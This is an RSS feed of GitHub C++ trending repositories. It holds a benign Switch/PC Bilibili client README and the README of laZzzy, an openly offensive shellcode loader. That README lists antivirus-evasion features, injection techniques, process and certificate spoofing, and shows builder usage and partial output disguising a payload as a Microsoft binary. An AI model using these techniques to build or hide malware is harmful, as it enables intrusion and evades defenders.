<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C++ Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-11-24T01:32:53Z</updated>
  <subtitle>Daily Trending of C++ in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>xfangfang/wiliwili</title>
    <updated>2022-11-24T01:32:53Z</updated>
    <id>tag:github.com,2022-11-24:/xfangfang/wiliwili</id>
    <link href="https://github.com/xfangfang/wiliwili" rel="alternate"></link>
    <summary type="html">&lt;p&gt;专为手柄控制设计的第三方跨平台B站客户端，目前可以运行在PC全平台和Nintendo Switch上 | Yet another Bilibili client [WIP]&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;wiliwili&lt;/h1&gt; &#xA;&lt;p&gt;一个专为手柄用户设计的 &lt;a href=&#34;https://www.bilibili.com&#34;&gt;B站&lt;/a&gt;客户端&lt;/p&gt; &#xA;&lt;img src=&#34;https://raw.githubusercontent.com/xfangfang/wiliwili/yoga/resources/icon/bilibili.png&#34; alt=&#34;icon&#34; height=&#34;128&#34; width=&#34;128&#34; align=&#34;left&#34;&gt; &#xA;&lt;p&gt;wiliwili 拥有非常接近官方PC客户端的B站浏览体验，&lt;br&gt; 同时支持&lt;strong&gt;触屏&lt;/strong&gt;与&lt;strong&gt;手柄&lt;/strong&gt;操控，&lt;br&gt; 让你的switch瞬间变身机顶盒与掌上平板。 &lt;br&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/xfangfang/wiliwili/releases&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/v/release/xfangfang/wiliwili&#34; alt=&#34;GitHub release (latest by date)&#34;&gt;&lt;/a&gt; &lt;img src=&#34;https://img.shields.io/github/downloads/xfangfang/wiliwili/total&#34; alt=&#34;GitHub All Releases&#34;&gt; &lt;img src=&#34;https://img.shields.io/github/stars/xfangfang/wiliwili?style=flat&#34; alt=&#34;GitHub stars&#34;&gt; &lt;img src=&#34;https://img.shields.io/github/forks/xfangfang/wiliwili&#34; alt=&#34;GitHub forks&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/-Nintendo%20Switch-e4000f?style=flat&amp;amp;logo=Nintendo%20Switch&#34; alt=&#34;NS&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/-Windows-357ec7?style=flat&amp;amp;logo=Windows&#34; alt=&#34;MS&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/-macOS-black?style=flat&amp;amp;logo=Apple&#34; alt=&#34;mac&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/-Linux-lightgrey?style=flat&amp;amp;logo=Linux&#34; alt=&#34;Linux&#34;&gt;&lt;/p&gt; &#xA;&lt;br&gt; &#xA;&lt;h1&gt;支持特性&lt;/h1&gt; &#xA;&lt;p&gt;多语言：简体、繁体（自动翻译）、英语&lt;br&gt; 主题色：支持根据主题自动切换深浅主题&lt;br&gt; 播放页：视频 番剧 影视 综艺，同时支持弹幕&lt;br&gt; 个人页：扫码登录 历史记录 个人收藏&lt;br&gt; 搜索页：热搜 视频 番剧 影视&lt;br&gt; 动态页：关注的UP主最近更新的视频&lt;br&gt; 直播页：支持观看关注的主播与其他系统推荐&lt;br&gt; 分类检索：快速找到想看的电影和番剧&lt;br&gt; 首页推荐：完美复制原版pc端布局&lt;/p&gt; &#xA;&lt;br&gt; &#xA;&lt;h1&gt;安装流程 (Nintendo Switch)&lt;/h1&gt; &#xA;&lt;ol start=&#34;0&#34;&gt; &#xA; &lt;li&gt;下载安装包：&lt;a href=&#34;https://github.com/xfangfang/wiliwili/releases&#34;&gt;wiliwili releases&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;将 wiliwili.nro 放置在内存卡路径： switch/wiliwili.nro&lt;/li&gt; &#xA; &lt;li&gt;在主页 &lt;code&gt;按住&lt;/code&gt; R键打开任意游戏进入 hbmenu，在列表中选择 wiliwili 点击打开即可。&lt;/li&gt; &#xA; &lt;li&gt;[可选] 在应用内安装桌面图标，入口：设置/实用工具/使用教程&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;br&gt; &#xA;&lt;h1&gt;TODO list&lt;/h1&gt; &#xA;&lt;p&gt; &lt;/p&gt;&#xA;&lt;details&gt; &#xA; &lt;summary id=&#34;todo&#34;&gt;点击展开&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; 初步完成底层基础组件、首页各类推荐视频、用户视频播放页&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; 微调页面、解决播放器启动速度慢、解决播放页面退出卡顿&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; 临时解决异步加载导致的空指针问题（图片异步加载某些情况还会出现问题，待修复）&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; 添加番剧/影视播放、添加扫码登录、播放历史、用户收藏夹（收藏夹相关部分工作不稳定）&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; 初步添加搜索&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; 播放页新增分集与UP主最新投稿&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; 完善视频播放页用户评论内容&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; 重构图片异步加载逻辑&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; 解决收藏夹、搜索页某些情况导致闪退的问题&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; 完善搜索页：番剧、影视 转为竖图&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; 完善播放页投稿列表：调整结构、自动加载下一页&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; 播放页展示合集与推荐&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; 添加动态页&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; 添加视频检索页&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; 完善设置页&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; 弹幕相关设置&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; 点赞、投币、收藏&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; 拖拽调节进度、长按快速调节进度&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; 增加单手模式使用一个手柄来控制播放器&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; 安装图标时检查wiliwili位置&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; NSP forwarder自动检查多个位置的nro文件，避免无法打开&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; 增加设置使首页无法通过返回退出，避免误触&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; 使用教程添加未指明的快捷键说明&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; 重压摇杆临时快进&lt;/li&gt; &#xA;  &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; 增加平板模式与电视模式页面样式的切换&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;br&gt; &#xA;&lt;h1&gt;反馈问题前要做的事&lt;/h1&gt; &#xA;&lt;p&gt;仅在 &lt;code&gt;最新大气层&lt;/code&gt; + &lt;code&gt;最新固件&lt;/code&gt; + &lt;code&gt;FAT32&lt;/code&gt; 内存卡测试。&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;首先确保 &lt;code&gt;大气层&lt;/code&gt;、&lt;code&gt;固件&lt;/code&gt;、&lt;code&gt;内存卡&lt;/code&gt; 三者符合要求&lt;/li&gt; &#xA; &lt;li&gt;确保switch系统时间正常，如果进入应用弹出 &lt;code&gt;网络错误&lt;/code&gt; 一般是由这个问题导致的。&lt;/li&gt; &#xA; &lt;li&gt;重置switch系统网络设置，尤其是DNS配置，某些DNS服务器无法正确解析API域名和视频地址&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;完整且详细地&lt;/code&gt; 描述你的问题，最好附加演示视频、截图。&lt;/li&gt; &#xA; &lt;li&gt;网络相关的问题附加 &lt;code&gt;网络诊断截图&lt;/code&gt;，入口：应用内设置/实用工具/网络诊断&lt;/li&gt; &#xA; &lt;li&gt;尝试复现问题，尽力找到BUG出现的规律&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;br&gt; &#xA;&lt;h1&gt;贡献&lt;/h1&gt; &#xA;&lt;p&gt;本应用基于 nanovg 绘制界面，nanovg底层可移植切换到任意图形库，视频播放部分则使用MPV+FFMPEG 通过OpenGL绘制。 所以按照我的理解 wiliwili 应该可以移植到任何一个内存大于500MB，支持OpenGL（ES）的设备。&lt;/p&gt; &#xA;&lt;p&gt;目前我正在处理mpv在switch上播放部分视频报错的问题，也欢迎了解 FFMPEG、MPV或命令行GDB调试的朋友与我联系共同研究。&lt;/p&gt; &#xA;&lt;br&gt; &#xA;&lt;h1&gt;开发&lt;/h1&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# 拉取代码&#xA;git clone --recursive https://github.com/xfangfang/wiliwili.git&#xA;cd wiliwili&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;PC本地运行&lt;/h3&gt; &#xA;&lt;p&gt;目前 wiliwili 支持运行在 Linux macOS 和 Windows上&lt;/p&gt; &#xA;&lt;p&gt;可以从 &lt;a href=&#34;https://github.com/xfangfang/wiliwili/actions/workflows/build.yaml&#34;&gt;Github-Actions&lt;/a&gt; 下载自动构建的测试版客户端&lt;/p&gt; &#xA;&lt;p&gt; &lt;/p&gt;&#xA;&lt;details&gt; &#xA; &lt;summary id=&#34;local-pc&#34;&gt;点击展开&lt;/summary&gt; &#xA; &lt;p&gt;构建出来的客户端某些图标缺失，请参考：&lt;a href=&#34;https://github.com/xfangfang/wiliwili/issues/13#issuecomment-1296299063&#34;&gt;https://github.com/xfangfang/wiliwili/issues/13#issuecomment-1296299063&lt;/a&gt;&lt;/p&gt; &#xA; &lt;h4&gt;macOS&lt;/h4&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# macOS: install dependencies&#xA;brew install glfw glm mpv&#xA;&#xA;cmake -B build -DPLATFORM_DESKTOP=ON&#xA;make -C build wiliwili -j$(sysctl -n hw.ncpu)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;h4&gt;Linux&lt;/h4&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# Ubuntu: install dependencies (glfw3.3 or later)&#xA;sudo apt install libcurl4-openssl-dev libglfw3-dev libglm-dev libmpv-dev&#xA;&#xA;cmake -B build -DPLATFORM_DESKTOP=ON&#xA;make -C build wiliwili -j$(nproc)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;h4&gt;Windows&lt;/h4&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# Windows: install dependencies (MSYS2 MinGW64)&#xA;pacman -S mingw-w64-x86_64-gcc mingw-w64-x86_64-cmake mingw-w64-x86_64-make \&#xA;  git mingw-w64-x86_64-glfw mingw-w64-x86_64-glm mingw-w64-x86_64-mpv&#xA;&#xA;cmake -B build -G &#34;MinGW Makefiles&#34; -DPLATFORM_DESKTOP=ON&#xA;mingw32-make -C build wiliwili -j$(nproc)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;/details&gt; &#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h3&gt;交叉编译 Switch 可执行文件 (wiliwili.nro)&lt;/h3&gt; &#xA;&lt;p&gt;推荐使用docker构建，本地构建配置环境略微繁琐不过可用来切换底层的ffmpeg或mpv等其他依赖库更灵活地进行调试。&lt;/p&gt; &#xA;&lt;p&gt; &lt;/p&gt;&#xA;&lt;details&gt; &#xA; &lt;summary id=&#34;local-switch&#34;&gt;点击展开&lt;/summary&gt; &#xA; &lt;h4&gt;Docker&lt;/h4&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;docker run --rm -v $(pwd):/data devkitpro/devkita64:20221113 \&#xA;  sh -c &#34;/data/scripts/build_switch.sh&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;h4&gt;本地编译&lt;/h4&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# 1. 安装devkitpro环境: https://github.com/devkitPro/pacman/releases&#xA;&#xA;# 2. 安装预编译的依赖&#xA;sudo dkp-pacman -S switch-glfw switch-glm switch-cmake devkita64-cmake switch-pkg-config&#xA;&#xA;# 3. 安装ffmpeg与mpv（使用自编译的库，官方的库无法播放网络视频）&#xA;# 手动编译方法请看：scripts/README.md&#xA;sudo dkp-pacman -U \&#xA;  https://github.com/xfangfang/wiliwili/releases/download/v0.1.0/switch-ffmpeg-4.4.3-1-any.pkg.tar.xz \&#xA;  https://github.com/xfangfang/wiliwili/releases/download/v0.1.0/switch-libmpv-0.34.1-1-any.pkg.tar.xz&#xA;&#xA;# 4. 可选：安装依赖库 nspmini：https://github.com/StarDustCFW/nspmini&#xA;# (1). 在resources 目录下放置：nsp_forwarder.nsp&#xA;# (2). cmake 构建参数添加 -DBUILTIN_NSP=ON&#xA;# 按上述配置后，从相册打开wiliwili时会增加一个安装NSP Forwarder的按钮&#xA;&#xA;# 5. build&#xA;cmake -B cmake-build-switch&#xA;make -C cmake-build-switch wiliwili.nro -j$(nproc)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;/details&gt; &#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;br&gt; &#xA;&lt;h1&gt;应用截图&lt;/h1&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/xfangfang/wiliwili/yoga/docs/images/screenshot-2.png&#34; alt=&#34;screenshot-2&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/xfangfang/wiliwili/yoga/docs/images/screenshot-1.png&#34; alt=&#34;screenshot-1&#34;&gt; &lt;/p&gt; &#xA;&lt;h1&gt;Acknowledgement&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;devkitpro and switchbrew &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/devkitPro/pacman/releases&#34;&gt;https://github.com/devkitPro/pacman/releases&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/devkitPro/pacman-packages&#34;&gt;https://github.com/devkitPro/pacman-packages&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/switchbrew/libnx&#34;&gt;https://github.com/switchbrew/libnx&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;natinusala and XITRIX &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/natinusala/borealis&#34;&gt;https://github.com/natinusala/borealis&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/XITRIX/borealis&#34;&gt;https://github.com/XITRIX/borealis&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Cpasjuste and proconsule &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/Cpasjuste/pplay&#34;&gt;https://github.com/Cpasjuste/pplay&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/proconsule/nxmp&#34;&gt;https://github.com/proconsule/nxmp&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/libcpr/cpr&#34;&gt;https://github.com/libcpr/cpr&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/nlohmann/json&#34;&gt;https://github.com/nlohmann/json&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/nayuki/QR-Code-generator&#34;&gt;https://github.com/nayuki/QR-Code-generator&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/BYVoid/OpenCC&#34;&gt;https://github.com/BYVoid/OpenCC&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>capt-meelo/laZzzy</title>
    <updated>2022-11-24T01:32:53Z</updated>
    <id>tag:github.com,2022-11-24:/capt-meelo/laZzzy</id>
    <link href="https://github.com/capt-meelo/laZzzy" rel="alternate"></link>
    <summary type="html">&lt;p&gt;laZzzy is a shellcode loader, developed using different open-source libraries, that demonstrates different execution techniques.&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;laZzzy&lt;/h2&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://img.shields.io/badge/python-3670A0?style=for-the-badge&amp;amp;logo=python&amp;amp;logoColor=ffdd54&#34; alt=&#34;Python&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/c++-%2300599C.svg?style=for-the-badge&amp;amp;logo=c%2B%2B&amp;amp;logoColor=white&#34; alt=&#34;C++&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/Visual%20Studio-5C2D91.svg?style=for-the-badge&amp;amp;logo=visual-studio&amp;amp;logoColor=white&#34; alt=&#34;Visual Studio&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&amp;amp;logo=windows&amp;amp;logoColor=white&#34; alt=&#34;Windows&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;laZzzy is a shellcode loader that demonstrates different execution techniques commonly employed by malware. laZzzy was developed using different open-source header-only libraries.&lt;/p&gt; &#xA;&lt;h3&gt;Features&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Direct syscalls and native (&lt;code&gt;Nt*&lt;/code&gt;) functions (not all functions but most)&lt;/li&gt; &#xA; &lt;li&gt;Import Address Table (IAT) evasion&lt;/li&gt; &#xA; &lt;li&gt;Encrypted payload (XOR and AES) &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Randomly generated key&lt;/li&gt; &#xA;   &lt;li&gt;Automatic padding (if necessary) of payload with NOPS (&lt;code&gt;\x90&lt;/code&gt;)&lt;/li&gt; &#xA;   &lt;li&gt;Byte-by-byte in-memory decryption of payload&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;XOR-encrypted strings&lt;/li&gt; &#xA; &lt;li&gt;PPID spoofing&lt;/li&gt; &#xA; &lt;li&gt;Blocking of non-Microsoft-signed DLLs&lt;/li&gt; &#xA; &lt;li&gt;(Optional) Cloning of PE icon and attributes&lt;/li&gt; &#xA; &lt;li&gt;(Optional) Code signing with spoofed cert&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;How to Use&lt;/h3&gt; &#xA;&lt;h4&gt;Requirements:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Windows machine w/ Visual Studio and the following components, which can be installed from &lt;em&gt;&lt;code&gt;Visual Studio Installer&lt;/code&gt; &amp;gt; &lt;code&gt;Individual Components&lt;/code&gt;&lt;/em&gt;:&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt; &lt;p&gt;&lt;code&gt;C++ Clang Compiler for Windows&lt;/code&gt; and &lt;code&gt;C++ Clang-cl for build tools&lt;/code&gt;&lt;/p&gt; &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/capt-meelo/laZzzy/main/img/clang.png&#34; alt=&#34;Clang&#34;&gt;&lt;/p&gt; &lt;/li&gt; &#xA;   &lt;li&gt; &lt;p&gt;&lt;code&gt;ClickOnce Publishing&lt;/code&gt;&lt;/p&gt; &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/capt-meelo/laZzzy/main/img/clickonce.png&#34; alt=&#34;ClickOne&#34;&gt;&lt;/p&gt; &lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Python3 and the required modules:&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;python3 -m pip install -r requirements.txt&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Options:&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;(venv) PS C:\MalDev\laZzzy&amp;gt; python3 .\builder.py -h&#xA;&#xA;⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀&#xA;⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣤⣤⣤⠀⢀⣼⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀&#xA;⠀⠀⣿⣿⠀⠀⠀⠀⢀⣀⣀⡀⠀⠀⠀⢀⣀⣀⣀⣀⣀⡀⠀⢀⣼⡿⠁⠀⠛⠛⠒⠒⢀⣀⡀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀&#xA;⠀⠀⣿⣿⠀⠀⣰⣾⠟⠋⠙⢻⣿⠀⠀⠛⠛⢛⣿⣿⠏⠀⣠⣿⣯⣤⣤⠄⠀⠀⠀⠀⠈⢿⣷⡀⠀⣰⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀&#xA;⠀⠀⣿⣿⠀⠀⣿⣯⠀⠀⠀⢸⣿⠀⠀⠀⣠⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣧⣰⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀&#xA;⠀⠀⣿⣿⠀⠀⠙⠿⣷⣦⣴⢿⣿⠄⢀⣾⣿⣿⣶⣶⣶⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀&#xA;⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀&#xA;⠀⠀by: CaptMeelo⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀&#xA;&#xA;usage: builder.py [-h] -s  -p  -m  [-tp] [-sp] [-pp] [-b] [-d]&#xA;&#xA;options:&#xA;  -h, --help  show this help message and exit&#xA;  -s          path to raw shellcode&#xA;  -p          password&#xA;  -m          shellcode execution method (e.g. 1)&#xA;  -tp         process to inject (e.g. svchost.exe)&#xA;  -sp         process to spawn (e.g. C:\\Windows\\System32\\RuntimeBroker.exe)&#xA;  -pp         parent process to spoof (e.g. explorer.exe)&#xA;  -b          binary to spoof metadata (e.g. C:\\Windows\\System32\\RuntimeBroker.exe)&#xA;  -d          domain to spoof (e.g. www.microsoft.com)&#xA;&#xA;shellcode execution method:&#xA;   1          Early-bird APC Queue (requires sacrificial proces)&#xA;   2          Thread Hijacking (requires sacrificial proces)&#xA;   3          KernelCallbackTable (requires sacrificial process that has GUI)&#xA;   4          Section View Mapping&#xA;   5          Thread Suspension&#xA;   6          LineDDA Callback&#xA;   7          EnumSystemGeoID Callback&#xA;   8          FLS Callback&#xA;   9          SetTimer&#xA;   10         Clipboard&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Example:&lt;/h4&gt; &#xA;&lt;p&gt;Execute &lt;code&gt;builder.py&lt;/code&gt; and supply the necessary data.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;(venv) PS C:\MalDev\laZzzy&amp;gt; python3 .\builder.py -s .\calc.bin -p CaptMeelo -m 1 -pp explorer.exe -sp C:\\Windows\\System32\\notepad.exe -d www.microsoft.com -b C:\\Windows\\System32\\mmc.exe&#xA;&#xA;⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀&#xA;⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣤⣤⣤⠀⢀⣼⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀&#xA;⠀⠀⣿⣿⠀⠀⠀⠀⢀⣀⣀⡀⠀⠀⠀⢀⣀⣀⣀⣀⣀⡀⠀⢀⣼⡿⠁⠀⠛⠛⠒⠒⢀⣀⡀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀&#xA;⠀⠀⣿⣿⠀⠀⣰⣾⠟⠋⠙⢻⣿⠀⠀⠛⠛⢛⣿⣿⠏⠀⣠⣿⣯⣤⣤⠄⠀⠀⠀⠀⠈⢿⣷⡀⠀⣰⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀&#xA;⠀⠀⣿⣿⠀⠀⣿⣯⠀⠀⠀⢸⣿⠀⠀⠀⣠⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣧⣰⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀&#xA;⠀⠀⣿⣿⠀⠀⠙⠿⣷⣦⣴⢿⣿⠄⢀⣾⣿⣿⣶⣶⣶⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀&#xA;⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀&#xA;⠀⠀by: CaptMeelo⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀&#xA;&#xA;[+] XOR-encrypting payload with&#xA;        [*] Key:                        d3b666606468293dfa21ce2ff25e86f6&#xA;&#xA;[+] AES-encrypting payload with&#xA;        [*] IV:                         f96312f17a1a9919c74b633c5f861fe5&#xA;        [*] Key:                        6c9656ed1bc50e1d5d4033479e742b4b8b2a9b2fc81fc081fc649e3fb4424fec&#xA;&#xA;[+] Modifying template using&#xA;        [*] Technique:                  Early-bird APC Queue&#xA;        [*] Process to inject:          None&#xA;        [*] Process to spawn:           C:\\Windows\\System32\\RuntimeBroker.exe&#xA;        [*] Parent process to spoof:    svchost.exe&#xA;&#xA;[+] Spoofing metadata&#xA;        [*] Binary:                     C:\\Windows\\System32\\RuntimeBroker.exe&#xA;        [*] CompanyName:                Microsoft Corporation&#xA;        [*] FileDescription:            Runtime Broker&#xA;        [*] FileVersion:                10.0.22621.608 (WinBuild.160101.0800)&#xA;        [*] InternalName:               RuntimeBroker.exe&#xA;        [*] LegalCopyright:             © Microsoft Corporation. All rights reserved.&#xA;        [*] OriginalFilename:           RuntimeBroker.exe&#xA;        [*] ProductName:                Microsoft® Windows® Operating System&#xA;        [*] ProductVersion:             10.0.22621.608&#xA;&#xA;[+] Compiling project&#xA;        